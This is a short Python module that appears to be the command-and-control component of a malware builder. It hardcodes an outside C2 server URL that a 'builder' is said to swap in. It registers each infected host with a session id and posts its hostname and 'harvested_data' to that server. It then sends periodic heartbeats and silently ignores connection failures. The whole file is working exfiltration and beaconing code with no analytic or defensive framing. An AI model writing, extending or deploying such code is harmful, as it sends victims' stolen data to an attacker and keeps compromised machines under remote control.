import requests
import uuid

# The builder will replace this URL
C2_URL = "https://tether-c2-communication-line-by-ebowluh.onrender.com" 
REGISTER_ENDPOINT = "/api/register"
HEARTBEAT_ENDPOINT = "/api/heartbeat"

session_id = str(uuid.uuid4())

def register_with_c2(hostname, harvested_data):
    """Sends the initial registration and all harvested data to the C2."""
    payload = {
        "session_id": session_id,
        "hostname": hostname,
        "data": harvested_data
    }
    try:
        requests.post(C2_URL + REGISTER_ENDPOINT, json=payload, timeout=15)
    except requests.RequestException:
        pass # C2 is offline or unreachable

def send_heartbeat():
    """Sends a periodic 'I'm alive' signal."""
    payload = {"session_id": session_id}
    try:
        requests.post(C2_URL + HEARTBEAT_ENDPOINT, json=payload, timeout=10)
    except requests.RequestException:
        pass